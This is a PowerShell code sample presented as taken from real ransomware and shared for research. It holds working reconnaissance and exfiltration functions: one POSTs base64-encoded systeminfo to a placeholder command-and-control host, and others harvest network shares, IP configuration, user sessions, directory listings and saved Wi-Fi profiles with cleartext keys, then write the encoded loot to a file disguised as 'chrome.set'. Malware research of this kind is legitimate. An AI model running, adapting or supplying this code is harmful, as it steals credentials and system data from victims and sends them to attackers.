// THIS CODE SAMPLE WAS TAKEN FROM REAL RANSOMWARE AND IS PROVIDED HERE ONLY FOR RESEARCH NEEDS !!!
// TO STOP RANSOMWARE WE NEED TO KNOW HOW IT WORKS INSIDE
// DON'T USE ANY OF THIS CODE SAMPLES FOR ANY CRIMINAL ACTIVITIES!

function GetSystemInfoAndSend() {
try{
$Headers=@{"User-Agent"="Mozilla";"Referer"="Referer Data"};
$q = systeminfo;
$q64=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($q));
$qsave=[uri]::EscapeDataString($q64);
$Body=@{"param"="1"};
$Req=Invoke-WebRequest -Uri http://SOME-C&C-REMOTE-ADDRESS-HERE/SOMEmarkerHERE/$qsave -Headers $Headers -Body $Body -Method POST;
}catch{}
}

function SleepCommand() {
Sleep(600);
}

function EncodeText($inputparam) {
	return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inputparam));
}

function GatherBasicInfo() {
 $info1 = wmic share get /format:list;
 $info2 = ipconfig /all;
 $info3 = systeminfo;
 $wifilist = ((netsh wlan show profiles) -match '\s{2,}:\s') -replace '.*:\s','';
 foreach ($wifi in $wifilist) {
  $info4 += netsh wlan show profile $wifi key=clear;
 }
 $qwinstaresults = qwinsta;
 return $info1+$info2+$info3+$wifilist+$info4+$qwinstaresults;
}

function GetMainDirs() {
$localusers = Get-LocalUser;
$dirc = Dir c:\;
$dirprog = Dir c:\'program files';
$curlocat = get-location;
$dircurloc = Dir $curlocat;
$dirdesk = Dir ([System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop));
$dirdwn = Dir $Home\Downloads;
$dirdocs = Dir $Home\Documents;
return $localusers+$dirc+$dirprog+$curlocat+$dircurloc+$dirdesk+$dirdwn+$dirdocs;
}

function MyTask1() {
$g1 = GatherBasicInfo;
$g2 = GetMainDirs;
$r=$g1+$g2;
$e = EncodeText($r);
sc -path $Home\Downloads\chrome.set -value $e;
}

